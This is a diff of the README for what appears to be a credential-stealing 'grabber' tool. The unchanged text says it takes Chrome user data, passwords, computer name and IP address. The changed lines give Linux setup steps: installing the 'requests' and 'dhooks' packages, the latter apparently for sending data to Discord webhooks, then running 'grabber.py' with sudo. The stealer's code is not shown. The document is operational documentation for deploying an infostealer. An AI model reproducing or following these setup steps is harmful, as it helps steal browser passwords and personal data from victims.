@@ -26,7 +26,8 @@ What it Grabs - ***Chrome User-data, Passwords, Computer Name, And IP.***
 
 **Linux**
 
-In Terminal/Command Line do `python -m pip install requests && python -m pip install dhooks`
+1) In Terminal/Command Line do `sudo python -m pip install requests && python -m pip install dhooks`
+2) Type in `cd Main` followed by `sudo python grabber.py`
 
 # Our Website.
 
